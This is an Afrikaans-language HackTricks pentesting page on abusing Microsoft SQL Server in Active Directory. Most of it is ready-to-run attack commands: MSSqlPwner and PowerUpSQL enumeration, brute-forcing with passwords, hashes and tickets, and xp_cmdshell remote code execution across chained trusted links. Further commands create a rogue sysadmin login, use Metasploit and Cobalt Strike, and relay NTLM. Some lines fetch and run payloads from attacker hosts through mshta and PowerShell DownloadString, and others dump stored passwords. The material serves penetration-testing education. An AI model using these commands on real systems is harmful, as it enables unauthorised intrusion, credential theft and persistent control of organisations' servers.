# MSSQL AD Abuse

{{#include ../../banners/hacktricks-training.md}}


## **MSSQL Enumerasie / Discovery**

### Python

Die [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)-tool is gebaseer op Impacket. Dit ondersteun authentication met Kerberos-tickets en attacks deur linked-server-kettings.<sup>[[1]](#references)</sup>

<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing hostname command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt

```
### Enumerering vanaf die netwerk sonder domeinsessie
```

# Interactive mode

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

```
---
### PowerShell

Die PowerShell-module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) bied funksies vir ontdekking, ouditering en uitbuiting in SQL Server-omgewings.<sup>[[2]](#references)</sup>
```bash
Import-Module .\PowerupSQL.psd1
```
### Enumerasie vanaf die netwerk sonder 'n domeinsessie
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have an AD account, you can try to find MSSQL instances by scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Enumerasie vanuit die domein
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

# Try dictionary attack to login
Invoke-SQLAuditWeakLoginPw

# Search SPNs of common software and try the default creds
Get-SQLServerDefaultLoginPw

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check connectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in one line
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## Basiese MSSQL-misbruik

### Toegang tot DB
```bash
# List databases
Get-SQLInstanceDomain | Get-SQLDatabase

# List tables in a DB you can read
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName

# List columns in a table
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName

# Get some sample data from a column in a table (columns username & password in the example)
Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10

#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lot of CSVs are generated in the current directory)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Dit kan ook moontlik wees om **opdragte uit te voer** op die MSSQL-host deur `xp_cmdshell`.<sup>[[5]](#references)</sup>
```bash
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Gaan die bladsy na waarna in die **volgende afdeling verwys word om dit handmatig te doen.**

### MSSQL Basic Hacking Tricks


{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

## MSSQL Trusted Links

As een MSSQL-instansie ’n ander een vertrou deur middel van ’n linked-server-konfigurasie, kan ’n gebruiker met voldoende toestemmings **daardie trust relationship gebruik om queries op die ander instansie uit te voer**. Hierdie skakels kan geketting word, wat moontlik ’n verkeerd gekonfigureerde server kan bereik waarop die gebruiker commands kan uitvoer.<sup>[[3]](#references)</sup>

**Die skakels tussen databasisse werk selfs oor forest trusts heen.**

### Powershell Misbruik
```bash
#Look for MSSQL links from an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkId > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted-link query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
Nog ’n tool wat gebruik kan word, is [**SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):<sup>[[6]](#references)</sup>
```bash
SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
# Cobalt Strike
inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
```
### Metasploit

Jy kan maklik met Metasploit vir vertroude skakels kyk.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Metasploit probeer slegs die `OPENQUERY()`-funksie te abuse. As command execution deur `OPENQUERY()` misluk, probeer die `EXECUTE`-metode **manueel**, soos hieronder beskryf.<sup>[[4]](#references)</sup>

### Handleiding - Openquery()

Vanaf **Linux** kan jy 'n MSSQL console shell met **sqsh** en **mssqlclient.py.** verkry.

Vanaf **Windows** kan jy ook die skakels vind en commands manueel uitvoer deur 'n **MSSQL client soos** [**HeidiSQL**](https://www.heidisql.com) te gebruik.<sup>[[7]](#references)</sup>

_Login met Windows authentication:_

![Metasploit - Handleiding - Openquery(): Login met Windows authentication](<../../images/image (808).png>)

#### Vind betroubare skakels
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![Manual - Openquery() - Vind betroubare skakels: EXEC sp linkedservers;](<../../images/image (716).png>)

#### Voer navrae in betroubare skakel uit

Voer navrae deur die skakel uit (voorbeeld: vind meer skakels in die nuwe toeganklike instansie):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
> [!WARNING]
> Kontroleer waar dubbele en enkele aanhalingstekens gebruik word; dit is belangrik om hulle op daardie manier te gebruik.

![Vind betroubare skakels - Voer navrae in betroubare skakel uit: Kontroleer waar dubbele en enkele aanhalingstekens gebruik word; dit is belangrik om hulle op daardie manier te gebruik](<../../images/image (643).png>)

Jy kan voortgaan om hierdie kettings van betroubare skakels handmatig te deurkruis.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Indien jy nie handelinge soos `exec xp_cmdshell` deur `OPENQUERY()` kan uitvoer nie, probeer die `EXECUTE`-metode.

### Handleiding - EXECUTE

Jy kan ook vertroude skakels met `EXECUTE` misbruik:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Plaaslike Privilege Escalation

Die **MSSQL service account** het dikwels die **`SeImpersonatePrivilege`**-gebruikersreg, wat die account toelaat om ’n kliënt ná authentication te impersonate.

’n Strategie waarmee baie outeurs vorendag gekom het, is om ’n SYSTEM-diens te dwing om by ’n rogue- of man-in-the-middle-diens wat die attacker skep, te authenticate. Hierdie rogue-diens kan dan die SYSTEM-diens impersonate terwyl dit probeer authenticate.

[SweetPotato](https://github.com/CCob/SweetPotato) versamel verskeie van hierdie tegnieke en kan deur Beacon se `execute-assembly`-command uitgevoer word.<sup>[[8]](#references)</sup>



### SCCM Management Point NTLM Relay (OSD Secret Extraction)
Kyk hoe die verstek SQL-rolle van SCCM **Management Points** misbruik kan word om Network Access Account- en Task-Sequence-secrets direk uit die site-database te dump:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

## References

- [1] [ScorpionesLabs – MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
- [2] [NetSPI – PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [3] [Microsoft Learn – Gekoppelde servers (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17)
- [4] [Microsoft Learn – OPENQUERY](https://learn.microsoft.com/en-us/sql/t-sql/functions/openquery-transact-sql?view=sql-server-ver17)
- [5] [Microsoft Learn – xp_cmdshell-bedienerkonfigurasie-opsie](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17)
- [6] [lefayjey – SharpSQLPwn](https://github.com/lefayjey/SharpSQLPwn)
- [7] [HeidiSQL](https://www.heidisql.com)
- [8] [CCob – SweetPotato](https://github.com/CCob/SweetPotato)
{{#include ../../banners/hacktricks-training.md}}
